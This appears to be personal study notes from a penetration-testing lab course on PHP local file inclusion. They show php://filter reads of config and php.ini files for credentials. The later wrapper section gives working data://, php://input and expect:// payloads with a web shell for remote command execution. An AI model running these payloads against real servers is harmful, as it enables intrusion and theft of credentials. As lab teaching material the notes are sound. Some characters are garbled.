# NOTES

```url
php://filter/read=convert.base64-encode/resource=config
```


## üß™ Standard PHP Inclusion (Without Filters)

If you include a `.php` file directly in an LFI context:
`http://target.com/index.php?page=config.php`


    You won't see source code.

    The file executes silently (especially config/setup files).

    May return blank, as these files don‚Äôt output HTML.
## üîç `php://filter` Wrapper ‚Äî Reading Source Code via LFI

The `php://filter` wrapper allows us to apply **filters** to a file stream. This is especially useful in **LFI (Local File Inclusion)** attacks to **read raw PHP source code** instead of executing it.

### Key Parameters

- **`read`**: Specifies which filter(s) to apply.
    
- **`resource`**: The target stream (usually a local file) you want to read and filter.
    

### Syntax

```
php://filter/read=<filter-name>/resource=<target-file>
```
### üí° Example: Base64 Encode a PHP File

To prevent a `.php` file from executing (which normally happens in LFI), you can read and encode it:
```
php://filter/read=convert.base64-encode/resource=config.php
```
Then decode the output to reveal the **source code** of `config.php`.

---
##  Why Use This?

### LFI and PHP Execution

When including a `.php` file through LFI:

- **By default**: It gets executed by the PHP engine.
    
- **Problem**: Config files like `config.php` don‚Äôt output anything to the browser, making it look like nothing was included.
    

### With `php://filter` + `base64`:

- You read the **raw code**, not the output.
    
- Helps extract secrets like:
    
    - DB credentials
        
    - API keys
        
    - Hidden file paths
        
    - Application logic
        

---
## üîó Types of Filters (Useful for Attacks)

PHP offers many filters. The ones most relevant to **security testing** and **LFI** are:

|Type|Example Filter|Use Case|
|---|---|---|
|**Conversion Filters**|`convert.base64-encode`|View source code of PHP files|
|String Filters|`string.strip_tags`|Strip HTML tags (less common for LFI)|
|Compression Filters|`zlib.inflate`|Read compressed content|
|Encryption Filters|Rarely used in exploits|Encrypt/decrypt streams|
## Practical LFI Source Code Reading Strategy

1. **Fuzz for all pages**: Not just `200 OK`, but also `301`, `302`, `403`.
    
2. **Start with `index.php`**: Read it using the base64 filter.
    
3. **Extract internal references**: Look for `include()`, `require()`, etc.
    
4. **Recursively read included files** using `php://filter` technique.
    
5. **Build a full picture** of how the application works.

# example attack:
```
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config  #<- config here is the php file name
```
![[Pasted image 20250430162009.png]]
## üß∞ Final Note

When dealing with LFI:

- **Use filters like `convert.base64-encode`** to bypass execution and extract readable source code.
    
- This can be critical in finding sensitive logic and credentials.
- **Tip:** When copying the base64 encoded string, be sure to copy the entire string or it will not fully decode. You can view the page source to ensure you copy the entire string.
 ## PHP Filters - Exercise[](https://www.zwarts-sec.com/posts/Hack-The-Box-File-Inclusion/#php-filters---exercise)

> Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

We‚Äôll use the `directory-list-2.3-small.txt` wordlist from the SecLists to perform web content discovery.

`|   |   | |---|---| ||ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php|`

After identifying the PHP file, we‚Äôll use the php://filter stream wrapper to encode the file‚Äôs content in Base64 format. Replace the redacted file name with the name of the discovered PHP file:

![[Pasted image 20250430164406.png]]

caido has a built in b64 decoder, we will use that.
![[Pasted image 20250430164738.png]]

# PHP WRAPPERS
## Data wrapper

The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.

**Checking PHP Configurations**
To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
``
**We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file.**
```shell-session
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` to see its value:
```shell-session
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```
Knowing how to check for the `allow_url_include` option can be very important, as `this option is not enabled by default`, and is required for several other LFI attacks, like using the `input` wrapper or for any RFI attack
#### Remote Code Execution

With `allow_url_include` enabled, we can proceed with our `data` wrapper attack. As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code. We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.

So, our first step would be to base64 encode a basic PHP web shell, as follows:

PHP Wrappers

```shell-session
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

`data` wrapper exmaple
```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Input

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

To repeat our earlier attack but with the `input` wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:

PHP Wrappers

```shell-session
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Note:** To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

---
## Expect

Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with `allow_url_include` earlier, but we'd `grep` for `expect` instead, and if it is installed and enabled we'd get the following:

PHP Wrappers

```shell-session
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

As we can see, the `extension` configuration keyword is used to enable the `expect` module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use the `expect://` wrapper and then pass the command we want to execute, as follows:

PHP Wrappers

```shell-session
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

